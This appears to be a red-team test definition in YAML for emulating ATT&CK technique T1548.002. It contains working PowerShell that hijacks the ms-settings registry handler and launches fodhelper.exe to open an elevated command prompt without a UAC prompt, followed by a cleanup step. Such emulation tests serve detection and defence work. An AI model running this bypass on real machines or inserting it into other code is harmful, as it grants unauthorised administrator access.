- id: e74e085f-1bed-5bfe-9761-167f6e04acb2
  name: Soumaia ART Tests - Bypass UAC using Fodhelper - PowerShell
  description: 'PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.

    Upon execution command prompt will be opened.'
  tactic: privilege-escalation
  technique:
    attack_id: T1548.002
    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
  platforms:
    windows:
      psh:
        command: |-
          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
          Start-Process "C:\Windows\System32\fodhelper.exe"
        cleanup: |-
          Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
